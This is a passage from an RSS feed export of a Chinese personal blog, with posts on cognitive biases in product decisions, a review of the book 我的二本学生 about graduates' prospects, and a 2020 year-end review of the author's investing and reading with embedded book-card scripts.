title=\"7、决策类偏误\"></a>7、决策类偏误</h4><p>结果偏误：评价决策好坏时，根据其最终结果，而不是根据做决策的过程。</p>\n<p>道德评价偏误：评价他人行为的道德时，根据结果而不是根据做出行为时的情境。资讯偏误：倾向寻求更多资讯以做出决策，即使寻求的资讯对决策没有帮助。</p>\n<p>共有资讯偏误：团队讨论倾向花较多时间与精力讨论所有成员都知道的事（即共有资讯），而花较少时间讨论较少成员知道的事。</p>\n<p>集体错觉：团体在决策过程中，由于成员倾向让自己的观点与团体一致，因而令整个团体缺乏不同的思考角度，不能进行客观分析。</p>\n<p>从众效应：倾向做很多人做的事，或相信很多人相信的事，以和他人保持一致，也就是“随大流”。</p>\n<p>沉没成本谬误：当人们证实先前累积的投入（沉没成本）已经浪费掉了，仍然对这些已经不能回收的成本念念不忘，因而做出不理性的选择。</p>\n<p>塞麦尔维斯反射：条件反射般地否定、拒绝新证据或新知识，因其有悖于现有的常规、信仰或价值观。</p>\n<p>麦纳马拉谬误：过度相信数据，依赖数据评估事情，忽略难以量化的事。此典故源自美国前国防部长麦纳马拉，他相信能用量化数据（如击毙越军的尸体数量和减少己方人员的伤亡数量）衡量美国在越战中的成功，但忽略了其他因素。</p>\n<h2 id=\"产品经理的选拔与成长\"><a href=\"#产品经理的选拔与成长\" class=\"headerlink\" title=\"产品经理的选拔与成长\"></a>产品经理的选拔与成长</h2><p>最后，俞军还提到了对于产品经理岗位的选拔和成长相关的话题。如一个成功产品是培养出一个好产品经理的必要条件，反之却不一定。当一种重要新技术或其他新要素找到合适应用，进入爆发期后，注定能创造巨大新价值，即使产品决策质量平庸一些，只要没被竞品拉开差距，也不会妨碍产品取得巨大的市场成功。（只有特定的“天选之子”能创造或能做到特定规模的产品，这样的情况虽然存在，但很难被证明或证伪。）在移动互联网发展后期的今天，产品实践机会已经变成最稀缺的资源，为每个产品实践机会去寻找、配备好的产品经理是值得的，一个好产品经理能提高产品的成功率和发展天花板。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>本书的内容更多的是从高阶的层面讲产品经理应该学习什么，比如产品经理要理解用户、产品和企业，要学习经济学相关领域的知识，要学会理解交易和交易模型，从而从更高的纬度去理解和完善产品的交易模型。</p>\n<p>除了这些基本的知识外，书中还告诉读者如何避免决策失误，产品经理如何选拔、成长等内容。建议产品经理或者对产品感兴趣的同学阅读。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/01/23/read002/",
          "creator": "",
          "pubDate": "2021-01-23T03:31:54.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/01/23/read002/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "f5544d9ecf827f918b1cf233590b524e",
          "highlights": []
        },
        {
          "title": "Read.001《我的二本学生》时代变迁下的青年学生命运",
          "description": "\n    \n      <p>这是前段时间微信读书推荐的一本书，随后发现朋友圈也有朋友在读，也勾起了我阅读的兴趣。看书名也能知道这是一本纪实书籍，作者是广东某二本高校的一名教师，通过她的视角，我们得以看到相差 9 年的 2 届毕业生在学习、就业、职业发展等所面临的种种状态。</p>\n<p>作者带的第一个\n    \n    ",
          "content": "<p>这是前段时间微信读书推荐的一本书，随后发现朋友圈也有朋友在读，也勾起了我阅读的兴趣。看书名也能知道这是一本纪实书籍，作者是广东某二本高校的一名教师，通过她的视角，我们得以看到相差 9 年的 2 届毕业生在学习、就业、职业发展等所面临的种种状态。</p>\n<p>作者带的第一个班级是 062111，在她的记录中，这一届学生毕业前都有着对未来美好前程的无限憧憬，而且和作者联系紧密的一些学生在毕业多年以后生活也还算可以，甚至有几位同学成家、置业，生活水平达到了中产以上。</p>\n<p>而当作者再一次接手毕业班时已是 1516045，2 个班级时间差别了 9 年，而这 9 年也是中国经济突飞猛进、社会财富开始积聚的 9 年。时间来到 2015 年这届学生，从他们那里作者看到的更多的是迷茫，尤其是在目前高物价、高房价、大学扩招的种种现实背景下，在书中作者是这样描述这些学生的。</p>\n<blockquote>\n<p>在考察062111班毕业多年的境况后，我依然为教育对年轻人前途的积极作用感到欣慰：尽管读大学对整个家庭而言，更像经过艰难权衡后的投资选择，经济成本与时间成本比我求学时代高得多；尽管两极分化的趋势已经显现，但我还是为班上大部分孩子，通过上大学能够换来一份衣食无忧的生活，感到踏实的庆幸。</p>\n<p>但通过近十年公共课、专业课上与孩子们的接触和观察，我感觉趋势发生了很大的改变，就算在经济发达的广东地区，就算我所面对的学生，大部分来自广东省，比之062111班，1516045班的孩子已有更多的个体，陷入了真实的迷惑和困顿。毕业季来临，越来越多的学生敲响我办公室的门，试图从班主任的口中，下载一个关于未来的坚定答案；越来越多的学生询问考研的细节、考公务员与创业的胜算，他们在穷尽各种可能后，往往回到一个问题：如果这样，念大学，到底有什么意义？我不知道，这种无法穷尽所有个体感知的清晰印象，是来自个别的偶然倾诉，还是包蕴了一个群体的确定趋势？</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>临近毕业，一种看不到出路的迷茫，成为他们真实又沉重的情绪。对比我带过的两个班，我明显感到1516045班孩子的精神状态，比不上062111班富有活力和朝气。尽管062111班是我们独立成系后，招收的第一届学生，各个方面都处于一种摸索和未知状态，但因为整体经济形势好，房价也相对合理，大部分学生，并未表现出悲观和迷惘的精神面貌，更没有一个学生，为了提高就业的竞争力，拼命去考研。而到1516045班，客观而言，不管在专业设置、师资配备、教学条件等方面，比之以前，都有了很大改善，更为重要的是，就业好，一直是我们学校在广东高校中拥有的良好口碑。但就算如此，还是难掩学生对未来和前途的深重担忧，很多学生，从大一开始，就早早谋划考研，班上考研学生的比例直线上升，人数也早早过半。对农村孩子而言，经历过大一的兴奋期后，一旦认清真相，意识到理想和现实的差距后，往往会陷入长久的情绪低落期。但我没有想到，1516045班的低落期如此之长，以至大四来临，还没有走出。</p>\n</blockquote>\n<hr>\n<p>当然，要说学生的状态差异也不能全是因为社会原因，家庭因素也有很大的占比。都说父母是孩子最好的老师，在孩子成长过程中性格、思想的很多方面多少都会受到家庭的影响，对于这点黄老师也有观察。</p>\n<blockquote>\n<p>越是和学生深入交流，越能感知其背后的家庭，在他们身上烙下的印痕，学生成长的可能性，越来越受制于家庭的溢出效应。我同样惊讶地发现，尽管在代际的偏见中，八零后、九零后甚至零零后，往往被贴上更多的标签，而事实上，如果能获得和他们平等交流的机会，其个体的丰富性，便会于自在的打开中，昭然若揭。令人欣慰的是，尽管就业的局促、房价的高涨，已成为他们一毕业就无可逃避的生存压力，但某种建设性的力量，还是从他们身上倔强地生长。无论是婉丽、沐光、芳坤对故乡、亲人的回望和牵挂，还是子然小小年纪就投身公益的热情，都让我看到喷薄而出的生命热力，和来自青春的尊严与尝试。</p>\n<p>更重要的是，对我而言，因为“导师制”所带来的近距离观察，年轻人身上所呈现的丰富性，极大地纠正了我的偏见。客观说来，尽管对他们而言，“读书改变命运”的成色，在教育市场化的语境下，早已褪色了很多，但在和更多的学生具体交流后，我还是能感受到农村孩子上大学的重要意义。他们从最底层的社会挣扎出来，在转型期的驳杂中，经历的心灵磨难、挣扎，并不比父辈少半点。他们也许错过了“读书改变命运”的时代，但他们避免了，若不读书，就会滑入更为糟糕境地的可能。当我从他们的讲述中，感知到身后一群群没有受到良好教育的孩子如何在底层挣扎的图景，我能明显感到，那群被抛出的孩子，其无望、狂放，早已成为社会触目惊心的疤痕。对沐光而言，在破败的村庄，若不是通过读书，等待他的，很有可能就是二弟的命运。就算暂时不能在城里立足，他来到广州的突围，也算得上一次胜利的逃离，通过念大学，他至少避免了变成烂仔的可能。</p>\n</blockquote>\n<p>家庭因素、就业压力、高成本的生活，种种因素也就造成了目前毕业生找工作难，生活看不到希望的种种情况。</p>\n<p>在我写此文的不久前，拼多多员工猝死在社会上引发激烈的讨论，也有部分拼多多员工借此曝光了该企业更多的企业细节。</p>\n<p><img src=\"/blogimg/20210117001.jpg\" alt=\"20210117001.jpg\"></p>\n<p align=\"center\">↑ 脉脉软件曝光的拼多多员工猝死信息，但随后该帖子被删除</p>\n\n<p>过去的 2020 年里有个词被提到的次数很多，那就是”内卷”。由于近一年多的新冠疫情影响，整个社会的就业压力增大，这又导致了大学扩招，更多的学生选择了考研，而选择了考研也并不意味着一帆风顺，留给后面几年的就业压力依旧也不小。</p>\n<p>最近一线城市的房价又开始涨了，现在实体经济不行，政府又放了太多的水，导致资产价格上行，目前在社交网络上每天都可以看到很多普通人晒基金收益、股票收益的，好像这个市场中赚钱就像呼吸一样简单。</p>\n<p>而经济如此下去，导致了更多的行业内卷、生活成本上升、房价上涨等等，这些问题不仅仅是很多毕业生要面临的，对于更多的社会普通阶层的打工人来讲，生活也是越来越不容易。</p>\n<blockquote>\n<p>我想起李萌在讨论课上的话：“我们横着去看这个社会的时候，当然可以说，我们很骄傲，我们的GDP增长了多少，我们在全世界排在第二，但是，当我们纵着去看这个时代，我们会发现，每个个体的人变得非常重要。因为我们每一个人只有一生，每个人只有一辈子，我们都是在为自己的一生而奔波而劳动，我们的爱恨情仇，在整个时代背景下，不过历史长河中的一朵小小浪花，但它却会真切地落到每个人身上，会让人椎心至痛。我们站在远方、站在高处，当然可以看到远方的河水波澜壮阔，但当我们置身人群深处的时候，是否知道自己身处何方？”</p>\n</blockquote>\n<p>经济数据当然重要，但数字背后是一个个活生生的人啊，生活不易。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/01/17/read001/",
          "creator": "",
          "pubDate": "2021-01-23T02:30:57.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/01/17/read001/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9b68de825c2ceb853cffe4bc11f1613e",
          "highlights": []
        },
        {
          "title": "2020 年年终总结",
          "description": "\n    \n      <blockquote>\n<p>对未来的真正慷慨，是把一切都献给现在。</p>\n<p style=\"text-align:right;\"> —– 加缪</p>\n\n</blockquote>\n<p>转眼间 2020 年已经接近尾声，现在回想年初新冠疫情的经历还历历在目，虽然间隔一年\n    \n    ",
          "content": "<blockquote>\n<p>对未来的真正慷慨，是把一切都献给现在。</p>\n<p style=\"text-align:right;\"> —– 加缪</p>\n\n</blockquote>\n<p>转眼间 2020 年已经接近尾声，现在回想年初新冠疫情的经历还历历在目，虽然间隔一年新冠病毒又开始肆虐来袭，病毒虽然可怕，但我们可以根据以往的经验进行防护；可是生活不是下围棋，你只能复盘过去的得失，却无法预测未来的发展。</p>\n<p>2020 年对大多数人来讲都是猝不及防的一年，当然对于我也一样，好在一年到头生活整体上还算过得去，从不同的层面看也会有一些得失，但得失会让我有更多的思考和总结，接下来就从生活的不从层面对过去的一年做个告别。</p>\n<h3 id=\"工作\"><a href=\"#工作\" class=\"headerlink\" title=\"工作\"></a>工作</h3><p>因为年初疫情的影响，很多行业都遭受了沉重的打击，实体行业最甚，互联网行业很多公司也受到影响，倒闭和裁员的一大批，加上今年毕业生数量的增加，整个就业市场很不乐观。</p>\n<p>庆幸的是我所在的公司没有被疫情影响太大，整体业务没有受到影响，所以工作一切如常，项目正常推进，就这样又平淡的过了一年。</p>\n<h3 id=\"投资\"><a href=\"#投资\" class=\"headerlink\" title=\"投资\"></a>投资</h3><p>3 月份全球金融市场受疫情影响连续下跌，美股、A股、港股以及欧洲主要市场的下跌都让人害怕。就连巴菲特在当时抄底航空股以后也很快的割肉离场，因为疫情对经济的影响实在是太大了，而市场是经济的晴雨表。</p>\n<p>不仅仅是航空股，连原油都下跌惨重，原因很简单，因为疫情影响，全球的出行市场受到大冲击，而作为目前全球交通主要燃料的石油需求也迅速下降，更甚至中国的投资者在原油市场出现了负的价格，真的是神奇。</p>\n<p>但在随后的 2 个月，金融市场开始逐渐恢复，价格开始上涨，直到今年年底，各类资产价格上涨都很多。</p>\n<h4 id=\"基金\"><a href=\"#基金\" class=\"headerlink\" title=\"基金\"></a>基金</h4><p>在 3 月份的下跌中，我虽然相信市场会恢复正常，但却没敢进行大量抄底，随后我又听从大佬的建议，买入了原油基金，最后原油继续下跌导致亏损，连带账户整体收益率下降了。</p>\n<p><img src=\"/blogimg/20201227001.jpg\" alt=\"20201227001.jpg\"></p>\n<p align=\"center\">↑ 截止至今基金账户整体收益</p>\n\n<p>截止到现在，基金账户总体收益刚刚 20%，还没有赶上大盘收益。当然这应该和我定投有关，因为平时并没有特别关注基金账户，买入基本是定投为主，每个月支付宝自动扣款买入，平时自己不用在这上面关心太多，但对应的收益率也不高。</p>\n<h4 id=\"🇺🇸-美股\"><a href=\"#🇺🇸-美股\" class=\"headerlink\" title=\"🇺🇸 美股\"></a>🇺🇸 美股</h4><p>说起美股，其实我并没有真正意义上的美股账户，之前已经在雪盈证券、微牛上注册账号，但是因为出入金难的问题，一直没有进行过出金操作。临近年底发现一个博主在推荐支持数字货币入金的美股证券，我看了看证券公司相关的信息，还是放弃了，毕竟资金安全才是第一位的。</p>\n<p>但是在今年 3 月份美股大跌时我在微牛开通了一个 $10000 的模拟账户，分别买入了 <code>APPL</code> 和 <code>MSFT</code>，买入的逻辑也非常简单，因为自己在互联网行业，深知技术对社会发展的深远影响，而苹果和微软也是全球为数不多的优质科技公司。</p>\n<p>虽然经历严重疫情，苹果拆股等事件，截止到现在整体收益率竟然也达到了 95% 以上，虽然和某些中概股以及电动车相关的股票没办法比，但这个账户我只在 3 月底买入操作了一次，中间再无其他操作，省心。当然，如果明年数字货币市场牛市发展不错的话，我或许会考虑转移部分资金到🇺🇸美股。</p>\n<p><img src=\"/blogimg/20201227002.jpg\" alt=\"20201227002.jpg\"></p>\n<p align=\"center\">↑ 美股模拟账户收益</p>\n\n<h4 id=\"数字货币\"><a href=\"#数字货币\" class=\"headerlink\" title=\"数字货币\"></a>数字货币</h4><p>数字货币今年的行情可谓是跌宕起伏，3 月份跟随传统金融市场大跌，比特币跌到 $3800 附近，爆仓金额超过百亿，而后市场开始逐步上涨，截止到现在比特币价格达到了 $28200。</p>\n<p><img src=\"/blogimg/20201227004.PNG\" alt=\"20201227004.PNG\"></p>\n<p align=\"center\">↑ 比特币现价</p>\n\n<p>而在今年的下半年，我从比特币现货市场开始转移到了期货市场，因为也是刚刚接触期货，前期盲目的跟随大V的想法进行操作，盲目做空比特币，导致短短几个月时间亏损 2 个 BTC，按照现在的价格进行计算，在期货市场交的学费折合一台长续航版的特斯拉 Model 3 了。</p>\n<p>所幸下半年比特币行情不错，我也及时进行了止损，目前也在总结自己的一套实践方法，截止到目前至少从人民币本位的价格计算还是赚的，至于币本位亏损的学费，明年再赚回来吧。</p>\n<p><img src=\"/blogimg/20201227003.jpg\" alt=\"20201227003.jpg\"></p>\n<p align=\"center\">↑ 期货账户实盘收益率</p>\n\n<p>前段时间接触到了期权，发现做期权比期货更加的安全，而且期权的策略组合可以很丰富的变化，这也是为什么很多大牛都在玩期权的原因。利用合理的衍生品工具，合理控制风险，不断放大利润。</p>\n<h3 id=\"一些感想\"><a href=\"#一些感想\" class=\"headerlink\" title=\"一些感想\"></a>一些感想</h3><p>随着比特币价格突破上次牛市高点，网络上各式各样的人都在讨论它了，不乏很多人说自己以前知道比特币但是没有买入，有些甚至说以前买过比特币，但是看不懂所以没有拿住，种种讨论最终指向一个最终结果：我错过了比特币，我错失了财富自由的机会。</p>\n<p>这个话题很有意思，万维钢在《直觉泵与其他思考工具》序言中也提到过这个问题，严格意义上这是一个哲学问题，而你也没有错过财富自由的机会，因为这个机会本就不属于你。万维钢序言片段如下：</p>\n<blockquote>\n<p>哲学的技艺科学家要做习题、棋手要打谱、律师和商人要学习案例，丹尼特说的“直觉泵”，就是哲学家的思维工具。这里的“直觉”是个好词儿，代表快速产生思维的灵感。直觉泵，就是说书中这些好像寓言故事和成语典故一样的思维工具，能给你“泵”出各种直觉来.</p>\n<p>咱们举个简单的例子，看看有章法的思维和普通人的思维有什么区别。</p>\n<p>现在比特币非常火了，要好几万元人民币一个，而几年前才值几块钱一个。有个技术爱好者很早就听说过比特币，当时没当回事儿。后来比特币几百元一个，他觉得太贵了还是没出手。现在的他追悔莫及，逢人就说他本来有机会成为百万富翁。</p>\n<p>如果他学过一点哲学，他就不会说这种傻话。丹尼特讲了一个直觉泵叫“古怪的狱卒”。说有个监狱里的狱卒，会在每天半夜犯人们都熟睡的时候，把监狱的大门打开几个小时。那请问，在这几个小时内，犯人们是自由的吗？</p>\n<p>如果那时候犯人能醒过来，他们的确可以逃跑！这就好像如果当年你知道比特币将来会那么值钱你一定会买一样。但是事实上那时候犯人是熟睡的，而你当年也真的不知道比特币的未来行情。</p>\n<p>这个直觉泵的要点在于，当你谈论“自由”的时候，你必须考虑当时外界的因果背景。你不知道和你睡着了一样，你的因果背景里没有那个选项，那不是真的自由，那不叫“有机会”。</p>\n<p>苏格拉底有句名言叫“未经审视的人生不值得过”，我们同样可以说，未经审视的思想不值得拥有——或者至少不值得说出来。</p>\n<p>学习哲学的第一步，就是要学会审视自己的思想。</p>\n</blockquote>\n<h3 id=\"阅读\"><a href=\"#阅读\" class=\"headerlink\" title=\"阅读\"></a>阅读</h3><p>今年因为长时间关注数字货币的原因，本以为阅读的书不多，但总结下来发现整体也读了 20 多本，主要的书目如下，因为书籍太多，没办法再附加每本书的摘录和读书笔记，明年我会尽可能的对读过的还不错的书形成对应的读书笔记发布到博客上。</p>\n<p><div id=\"35188914\"><div></div></div></p>\n<p><div id=\"35050614\"><div></div></div></p>\n<p><div id=\"20390865\"><div></div></div></p>\n<p><div id=\"26798608\"><div></div></div></p>\n<p><div id=\"24325274\"><div></div></div></p>\n<p><div id=\"35033233\"><div></div></div></p>\n<p><div id=\"35060315\"><div></div></div></p>\n<p><div id=\"35009826\"><div></div></div></p>\n<p><div id=\"34997975\"><div></div></div></p>\n<p><div id=\"30192587\"><div></div></div></p>\n<p><div id=\"35047171\"><div></div></div></p>\n<p><div id=\"27622006\"><div></div></div></p>\n<p><div id=\"34952676\"><div></div></div></p>\n<p><div id=\"30377678\"><div></div></div></p>\n<p><div id=\"34925762\"><div></div></div></p>\n<p><div id=\"30443502\"><div></div></div></p>\n<p><div id=\"25985021\"><div></div></div></p>\n<p><div id=\"27601129\"><div></div></div></p>\n<p><div id=\"33464162\"><div></div></div></p>\n<p><div id=\"26985299\"><div></div></div></p>\n<p><div id=\"30229576\"><div></div></div></p>\n<p><div id=\"30401752\"><div></div></div></p>\n<p><div id=\"34438225\"><div></div></div></p>\n<p><div id=\"34906885\"><div></div></div></p>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>2020 马上过去，我已然忘记了自己年初对今年的期望，只是经历这一年，疫情、工作、投资以及生活的种种，亦或许是因为年龄增长到某个节点的缘故，对生活的细节感受想要变得更加具体。</p>\n<p>最近也加入了孟岩老师的有知有行投资课，一方面希望自己能够做到知行合一，另一方面也希望在接下来的一年里，自己能够更好的阅读和生活。</p>\n<p>对于投资方面，希望自己在期货和期权方面能够学到一些东西，形成自己的一套交易策略，在降低风险的前提下去放大利润，看看这辆特斯拉学费明年能给我挣回来几辆吧，最后也争取明年进行🇺🇸美股出入金操作。</p>\n<p>2020 再见，2021 你好！</p>\n<p><img src=\"/blogimg/20201227005.jpg\" alt=\"20201227005.jpg\"></p>\n<p align=\"center\">↑ 有知有行投资课报名海报</p>\n\n<script type=\"text/javascript\">\n    setBookInfo(7.5,7.5,'35188914','https://book.douban.com/subject/35188914/','https://img3.doubanio.com/view/subject/s/public/s33716660.jpg','价值','张磊','高瓴创始人兼首席执行官张磊首部力作,沉淀15年，张磊的投资思想首度全面公开<br>全书共3个部分10个章节，介绍了张磊的个人历程、他所坚持的投资理念和方法以及他对价值投资者自我修养的思考，还介绍了他对具有伟大格局观的创业者、创业组织以及对人才、教育、科学观的理解。书中包含 大 量珍贵资料，不仅有首次提出的7大高瓴公式，详细拆解的10多个投资案例，还有11张精致手绘彩插和19张珍贵照片。')\n\n    setBookInfo(8.5,9,'35050614','https://book.douban.com/subject/35050614/','https://img9.doubanio.com/view/subject/s/public/s33702245.jpg','我的二本学生','黄灯','作者黄灯在一所二本院校从教,长期的课堂教学以及课后的师生交流，使她成为这群学生成长变化的见证者。《我的二本学生》相当于她的教学札记，这里面有她15年一线教学经验的分享，对4500个学生的长期观察和长达10年的跟踪走访，也有两届班主任工作的总结思考，更有近100名学生的现身说法，是黄灯向读者描摹一群年轻人生活剪影的尝试。')\n\n    setBookInfo(7.5,8,'20390865','https://book.douban.com/subject/20390865/','https://img1.doubanio.com/view/subject/s/public/s24438658.jpg','投资交易心理分析','布雷特 N. 斯蒂恩博格','《投资交易心理分析》内容简介：战胜自身心智才可战胜资本市场，破解心理谜团方能胜出投资博弈。当市场跟你耍花招时，你不再困惑，取而代之的是一种“曾经沧海”的感觉，任何东西都无法替代因经验而产生的自信。再好的投资策略与交易系统都要经受交易心理的考验。')\n\n    setBookInfo(7.5,8,'26798608','https://book.douban.com/subject/26798608/','https://img2.doubanio.com/view/subject/s/public/s28738153.jpg','3小时快学期权','上海证券交易所衍生品部','如果将衍生品比作金融产品中的皇冠，那么期权以其复杂性和策略多变性当之无愧成为这顶皇冠上的明珠，期权在满足投资者更多样化的风险管理和产品设计需求的同时，也具有杠杆性高、专业性强、风险大、投资策略多变性等特征，这从客观上要求参与期权交易的投资者应当熟悉期权投资知识和交易规则，具有较强的风险承受能力，投资者培育作为保障期权市场长期健康发展的重要因素。在期权产品上市前，上交所就针对投资者持续开展了一系列培训活动，意识到能否将复杂深奥的期权知识以通俗易懂的方式展示给投资者是培育工作成功与否的关键，于是以历史穿越笔法，将期权知识凝练成江湖上大名鼎鼎的“独孤九剑剑诀”，囊括了期权交易从入门到进阶的相关知识，形象概述了期权交易投资的精要。')\n\n    setBookInfo(7.8,8,'24325274','https://book.douban.com/subject/24325274/','https://img1.doubanio.com/view/subject/s/public/s26682138.jpg','海龟交易法则',' [美] 柯蒂斯·费思','在金融界，流传着这样一个著名的故事。1983年，美国期货界的两个挚友——理查德•丹尼斯与威廉•埃克哈特之间就一个问题产生了分歧：伟大的期货交易者究竟是天生的，还是可以后天培养的？他们就这个问题进行了一场赌博，并为寻找答案进行了一场试验，这就是著名的“海龟交易试验”。')\n\nsetBookInfo(7.8,8.0,'35033233','https://book.douban.com/subject/35033233/','https://wfqqreader-1252317822.image.myqcloud.com/cover/568/30842568/t6_30842568.jpg','大钱细思：优秀投资者如何思考和决断','[美]乔尔?蒂林哈斯特（Joel Tillinghast）','说起富达基金，人们首先就会想到超级明星彼得·林奇，在执掌富达麦哲伦基金的13年中，林奇将旗下资产规模从1800万美元奇迹般地发展为140亿美元。<br>不过现在，投资专家们更关注乔尔·蒂林哈斯特的一举一动。他不仅是林奇亲自选定的衣钵传人，更保持了惊人的近30年的成功选股纪录。1989年，蒂林哈斯特创建了富达低价股基金，从那时起到现在，该基金年平均回报率高达13.8%，规模成长到了400多亿美元。')\n\nsetBookInfo(7.8,8.0,'35060315','https://book.douban.com/subject/35060315/','https://wfqqreader-1252317822.image.myqcloud.com/cover/523/31265523/t6_31265523.jpg','向上生长','九边','百万读者称赞口碑作者，九边首部力作。<br>本书从多个角度，阐述我们在生活中遇到的各种困惑、难题，然后逐个进行深层分析，从而告诉你如何精准选择，抓住每一次出现的机会，拥有一条一路向前的人生路径。')\n\nsetBookInfo(8.8,9.0,'35009826','https://book.douban.com/subject/35009826/','https://img9.doubanio.com/view/subject/s/public/s33622685.jpg','一生的旅程',' [美] 罗伯特·艾格 / [美] 乔尔·洛弗尔','◆比尔·盖茨罕见2000字推荐，神级领导力教科书。<br>◆这是我多年来读过最好的商业书之一。——比尔盖茨<br>◆迪士尼CEO自述如何请比我优秀的人为我工作！<br>◆《纽约时报》畅销书排行榜第1名！现象级全球畅销书，畅销美、英、德、法等20国！<br>◆改变好莱坞格局，迪士尼成为好莱坞代名词！2019年迪士尼出品的电影占全美电影票房近四成！')\n\nsetBookInfo(8.5,9,'34997975','https://book.douban.com/subject/34997975/','https://img3.doubanio.com/view/subject/s/public/s33638692.jpg','文明、现代化、价值投资与中国','李录','《文明、现代化、价值投资与中国》是喜马拉雅资本创始人、查理·芒格家族资产管理人、价值投资思想第三代代表人物李录的文集。全书包含上下两篇，上篇脱胎于在投资界口耳相传的“现代化十六讲”，作者提出了人类社会从1.0文明到3.0文明演化的思想，讨论了现代化的诞生、本质与铁律。作者站在全体人类的角度，思考人类未来的共同命运；同时，对中国未来的现代化演进进程做出了预测。下篇收录了作者二十余年来的重要演讲、思考与书评，其中包括作者在北京大学光华管理学院、哥伦比亚大学商学院等的几次著名演讲，除了涉及价值投资的观念、方法与实践外，作者还对人类与人性、时代与未来等问题进行了思考。')\n\n        setBookInfo(7.8,8,'30192587','https://book.douban.com/subject/30192587/','https://img3.doubanio.com/view/subject/s/public/s29737802.jpg','塑造世界经济的50项伟大发明','[英] 蒂姆·哈福德','这本书聚焦于世界经济运行中令人着迷的一些细节，为此挑选了50项具体发明——纸张、条形码、知识产权和书写本身等。在每一个案例中，我们会近距离观察，看看这些发明到底改变了什么。一路上，我们会发现一些令人惊讶的问题的答案。')\n\n        setBookInfo(8.1,8,'35047171','https://book.douban.com/subject/35047171/','https://img9.doubanio.com/view/subject/s/public/s33631354.jpg','影响商业的50本书','吴晓波','解商业世界，要从哪里开始？著名财经作家吴晓波，从私人书房的上千本商业经典中，精心挑选出50部代表性作品，逐一重读，带你用一本书的时间，理解近300年来的经济理论迭代、商业发展脉络。同时，也为拥有不同理论基础和阅读爱好的读者，提供了诚意满满的宝藏书单。')\n\n        setBookInfo(8.6,9,'27622006','https://book.douban.com/subject/27622006/','https://img1.doubanio.com/view/subject/s/public/s29700059.jpg','投资中不简单的事','邱国鹭 / 邓晓峰 / 卓利伟 / 孙庆瑞 / 冯柳 / 王世宏','●投资中变与不变的是什么？如何把对市场状态的识别应用于投资实践？如何在资本市场中屏蔽噪音，做出正确的决策？如何用很“笨”的基本面投资逻辑，挣“守正出奇”之大财？ 继《投资中最简单的事》后，高毅资产诚意推出又一价值投资力作《投资中不简单的事》。')\n\n        setBookInfo(9.0,9,'34952676','https://book.douban.com/subject/34952676/','https://piccdn3.umiwi.com/img/202003/30/202003301944477760458649.jpg?x-oss-process=image/resize,m_fill,h_320,w_240','苏世民：我的经验与教训','[美] 苏世民','这是一部投资、管理类图书，是一部关于成功创业的书，还是一部处世哲学。<br>苏世民创立的黑石集团是全球私募股权资产管理公司和房地产管理公司的巨头。截至2019年第三季度，黑石管理的资金总额超过5500亿美元。黑石集团人均利润是高盛的9倍，过去30余年平均回报率高达30%以上。美国排名前50的公司和养老基金中，70%以上都有黑石的投资。')\n\n        setBookInfo(8.5,9,'30377678','https://book.douban.com/subject/30377678/','https://img1.doubanio.com/view/subject/s/public/s33678368.jpg','曾国藩传','张宏杰','曾国藩，没有显赫的家世，天赋堪称晚清同时代大人物当中最差，却官至两江总督、直隶总督、武英殿大学士，在复杂的时代变局中超越众人，成就最大，被誉为大清“中兴第一名臣”，且最后全身而退。他的人生经历，无论是过去还是现在都给人以特别的启示。')\n\n        setBookInfo(7.5,8,'34925762','https://book.douban.com/subject/34925762/','https://img3.doubanio.com/view/subject/s/public/s33551591.jpg','钱从哪里来','唐涯','1. 2019—2020年罗振宇“时间的朋友”跨年演讲重磅推荐，帮你找准自己的财富坐标。<br>2. 香帅最新力作，用通俗的语言、详实的数据、生动的案例为你解析，2020年，我们如何撬动财富。<br>3. 财富只是结果，前提是“人”+“资金“”的正确决策。本书用宏观、行业、城市、资产四大角度，为你锚定财富容器与载体，找到财富的逻辑。')\n\n        setBookInfo(9.5,10,'30443502','https://book.douban.com/subject/30443502/','https://img9.doubanio.com/view/subject/s/public/s29988314.jpg','周期',' [美]霍华德·马克斯','每个投资人都想弄清楚自己现在所处的周期位置。也就是说，人们渴望知道自己下一步应该追加投资，继续留在市场，还是应该果断卖出，离开市场。大家都知道市场周期起伏波动，然而，大部分投资人往往只想到市场周期的首层浅思维。这本书会带你进入市场周期的二层浅思维，教你看懂过去的周期规律，看清现在的周期位置，看透未来的周期趋势，获得少数赢家穿越金融危机、长期战胜市场的投资布局真经。')\n\n        setBookInfo(8.0,8,'25985021','https://book.douban.com/subject/25985021/','https://img2.doubanio.com/view/subject/s/public/s27814883.jpg','人类简史',' [以色列] 尤瓦尔·赫拉利','十万年前，地球上至少有六种不同的人<br>但今日，世界舞台为什么只剩下了我们自己？<br>从只能啃食虎狼吃剩的残骨的猿人，到跃居食物链顶端的智人，<br>从雪维洞穴壁上的原始人手印，到阿姆斯壮踩上月球的脚印，<br>从认知革命、农业革命，到科学革命、生物科技革命，<br>我们如何登上世界舞台成为万物之灵的？')\n\n        setBookInfo(8.2,8,'27601129','https://book.douban.com/subject/27601129/','https://img1.doubanio.com/view/subject/s/public/s29634599.jpg','股票大作手回忆录',' 埃德温·勒菲弗','杰克 施瓦格在对当代30位证券交易员的采访时，向他们提出了同样一个问题：哪一本书让证券交易员过目不忘、受益匪浅？《股票大作手回忆录》独占榜单名首。这本书记录了美国股票史上传奇人物杰西·利弗莫尔（Jesse 